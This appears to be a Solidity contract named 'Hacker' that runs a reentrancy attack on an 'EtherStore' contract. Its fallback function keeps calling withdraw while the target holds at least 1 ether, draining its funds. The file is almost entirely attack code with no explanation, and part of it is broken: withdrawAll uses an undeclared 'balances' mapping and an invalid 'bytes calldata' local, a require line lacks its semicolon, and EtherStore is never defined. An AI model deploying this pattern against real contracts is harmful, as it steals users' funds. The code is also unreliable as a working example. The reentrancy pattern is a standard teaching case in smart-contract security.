// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Hacker {
     EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    
    function withdrawAll() public returns (uint256 remainingBal) {
        
        uint256 bal  = balances[address(this)];

        (bool sent, bytes calldata data) = msg.sender.call{value: bal}("");

        require(sent, "Failed to send Ether")
        
        return balances[msg.sender];
    }

}